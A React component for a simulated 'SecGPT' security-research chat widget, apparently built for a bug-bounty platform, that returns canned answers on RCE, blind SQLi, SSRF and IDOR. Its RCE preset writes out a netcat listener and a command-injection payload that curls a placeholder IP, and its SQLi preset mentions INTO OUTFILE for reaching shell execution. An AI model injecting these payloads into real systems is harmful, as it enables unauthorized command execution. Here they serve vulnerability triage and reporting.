import { useState, useRef, useEffect } from 'react'
import { useAuth } from '../../hooks/useAuth'

const PRESETS = [
  {
    q: 'Draft RCE exploit steps',
    a: `### Proof of Concept: Remote Code Execution (RCE)\n\nTo document RCE via deserialization or injection, use the following standard triage structure:\n\n1. **Setup**: Deploy a netcat listener locally to verify outbound connections:\n   \`\`\`bash\n   nc -lvnp 4444\n   \`\`\`\n2. **Payload**: Inject a curl command directed at your listener/burp collaborator inside the vulnerable parameter:\n   \`\`\`\n   ; curl http://<YOUR_IP>:4444/poc_confirmed ;\n   \`\`\`\n3. **Execution**: Send the payload to the endpoint. Verify that the server logs a connection showing outbound communication, proving command execution.`
  },
  {
    q: 'Explain blind SQLi impact',
    a: `### Vulnerability Impact: Blind SQL Injection\n\nBlind SQL Injection (Boolean or Time-based) holds a severe risk score (typically High or Critical depending on exposure):\n\n*   **Confidentiality**: Extreme. Attackers can leak database contents sequentially (e.g., usernames, hashed passwords, PII) using conditional queries.\n*   **Integrity**: High. In some DBMS environments, attackers can write files to the webroot (e.g., \`INTO OUTFILE\`) to achieve shell execution.\n*   **CVSS Recommended Base Score**: **8.2 (High)** \`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\``
  },
  {
    q: 'SSRF mitigation advice',
    a: `### Remediation: Server-Side Request Forgery (SSRF)\n\nTo securely prevent SSRF vulnerabilities across endpoints that fetch remote contents:\n\n1. **Network Whitelisting**: Restrict outbound fetches exclusively to a designated whitelist of safe domains.\n2. **Disable Loopback**: Blacklist access to loopback IPs and internal ranges (e.g., \`127.0.0.1\`, \`10.0.0.0/8\`, \`192.168.0.0/16\`, and the cloud metadata service \`169.254.169.254\`).\n3. **Response Validation**: Ensure the server verifies that response headers match the expected mime-type and reject unexpected redirection chains.`
  },
  {
    q: 'Analyze auth bypass scenario',
    a: `### Scenario Analysis: Broken Object Level Authorization (BOLA / IDOR)\n\nIf you discover that changing an \`account_id\` parameter allows viewing unauthorized profiles:\n\n*   **Verification**: Capture both requests in Burp Repeater. Log in as Hunter-A, fetch Profile-B, and verify if the data is returned without a 403 Forbidden status.\n*   **PoC Recommendation**: Always redact personal data of other accounts in your screenshot submission. Only prove access to a dummy profile created by yourself.`
  }
]

export default function AICopilot() {
  const { isAuthenticated } = useAuth()
  const [isOpen, setIsOpen] = useState(false)
  const [messages, setMessages] = useState([
    { role: 'system', text: '[SYSTEM] SecGPT-v1.0 initialized. Secure link active. Standing by, Operator.' }
  ])
  const [input, setInput] = useState('')
  const [isTyping, setIsTyping] = useState(false)
  const chatEndRef = useRef(null)

  useEffect(() => {
    if (chatEndRef.current) {
      chatEndRef.current.scrollIntoView({ behavior: 'smooth' })
    }
  }, [messages, isTyping])

  if (!isAuthenticated) return null

  const handleSend = (textToSend) => {
    const query = textToSend || input
    if (!query.trim()) return

    setMessages((prev) => [...prev, { role: 'user', text: query }])
    if (!textToSend) setInput('')
    setIsTyping(true)

    // Simulate AI terminal analysis
    setTimeout(() => {
      let matchedAns = 'I have analyzed your query. To provide a high-fidelity recommendation, please specify the exact vulnerability class (e.g., SSRF, XSS, RCE, IDOR).'
      
      const matchedPreset = PRESETS.find(p => p.q.toLowerCase().includes(query.toLowerCase()) || query.toLowerCase().includes(p.q.toLowerCase()))
      if (matchedPreset) {
        matchedAns = matchedPreset.a
      } else if (query.toLowerCase().includes('hello') || query.toLowerCase().includes('hi')) {
        matchedAns = 'Greetings, Operator. I am SecGPT, your tactical security research copilot. Ask me to draft RCE steps, explain SQLi, or recommend SSRF mitigations!'
      }

      setMessages((prev) => [...prev, { role: 'assistant', text: matchedAns }])
      setIsTyping(false)
    }, 1200)
  }

  return (
    <div className="fixed bottom-6 right-6 z-50 font-mono text-xs">
      {/* Floating Action Button */}
      {!isOpen && (
        <button
          onClick={() => setIsOpen(true)}
          className="relative flex items-center justify-center w-14 h-14 bg-primary text-on-primary hover:brightness-110 active:scale-95 shadow-[0_0_20px_rgba(164,255,185,0.4)] transition-all animate-pulse"
        >
          <span className="material-symbols-outlined text-2xl">smart_toy</span>
          <span className="absolute -top-1 -right-1 flex h-3 w-3">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-secondary opacity-75" />
            <span className="relative inline-flex rounded-full h-3 w-3 bg-secondary" />
          </span>
        </button>
      )}

      {/* Copilot Window */}
      {isOpen && (
        <div className="w-[380px] sm:w-[400px] h-[500px] bg-surface-container border border-primary/20 shadow-2xl flex flex-col overflow-hidden animate-fade-in">
          {/* Header */}
          <div className="bg-surface-container-high px-4 py-3.5 border-b border-white/5 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75" />
                <span className="relative inline-flex rounded-full h-2 w-2 bg-primary" />
              </span>
              <p className="font-bold text-on-surface tracking-wider uppercase text-[10px]">SecGPT Copilot v1.0</p>
            </div>
            <button
              onClick={() => setIsOpen(false)}
              className="text-on-surface-variant hover:text-error transition-colors"
            >
              <span className="material-symbols-outlined text-lg">close</span>
            </button>
          </div>

          {/* Chat Messages */}
          <div className="flex-1 p-4 overflow-y-auto space-y-4 bg-surface-container-lowest scrollbar-thin">
            {messages.map((msg, i) => (
              <div
                key={i}
                className={`flex flex-col ${
                  msg.role === 'user' ? 'items-end' : 'items-start'
                }`}
              >
                <span className="text-[8px] uppercase tracking-wider text-outline mb-1">
                  {msg.role === 'system' ? 'System' : msg.role === 'user' ? 'Operator' : 'SecGPT'}
                </span>
                <div
                  className={`p-3 max-w-[90%] whitespace-pre-wrap leading-relaxed ${
                    msg.role === 'system'
                      ? 'bg-surface-container border-l-2 border-outline-variant text-outline'
                      : msg.role === 'user'
                      ? 'bg-secondary/15 text-secondary border border-secondary/20'
                      : 'bg-primary/10 text-on-surface border border-primary/15'
                  }`}
                >
                  {msg.text}
                </div>
              </div>
            ))}

            {isTyping && (
              <div className="flex flex-col items-start">
                <span className="text-[8px] uppercase tracking-wider text-outline mb-1">SecGPT</span>
                <div className="bg-primary/10 text-primary p-3 flex items-center gap-1 border border-primary/15">
                  <span className="animate-pulse">Analyzing attack vector</span>
                  <span className="border-r-2 border-primary animate-ping pr-1 h-3" />
                </div>
              </div>
            )}
            <div ref={chatEndRef} />
          </div>

          {/* Preset Queries */}
          <div className="p-3 bg-surface-container-high border-t border-white/5 space-y-1.5 max-h-[120px] overflow-y-auto">
            <p className="text-[8px] uppercase tracking-wider text-outline-variant font-bold mb-1">Suggested Protocols</p>
            <div className="flex flex-wrap gap-1.5">
              {PRESETS.map((preset, i) => (
                <button
                  key={i}
                  onClick={() => handleSend(preset.q)}
                  className="px-2 py-1 bg-surface-container hover:bg-primary/10 hover:text-primary border border-white/5 text-[9px] uppercase tracking-wider text-on-surface-variant transition-colors"
                >
                  {preset.q}
                </button>
              ))}
            </div>
          </div>

          {/* Input Footer */}
          <form
            onSubmit={(e) => {
              e.preventDefault()
              handleSend()
            }}
            className="p-3 bg-surface-container border-t border-white/5 flex gap-2"
          >
            <input
              type="text"
              placeholder="Ask SecGPT..."
              value={input}
              onChange={(e) => setInput(e.target.value)}
              className="flex-1 bg-surface-container-lowest border border-white/5 focus:border-primary/50 text-[11px] p-2.5 font-mono focus:outline-none text-on-surface"
            />
            <button
              type="submit"
              className="px-4 bg-primary text-on-primary font-bold uppercase hover:brightness-110 transition-all flex items-center justify-center shrink-0"
            >
              <span className="material-symbols-outlined text-sm">send</span>
            </button>
          </form>
        </div>
      )}
    </div>
  )
}
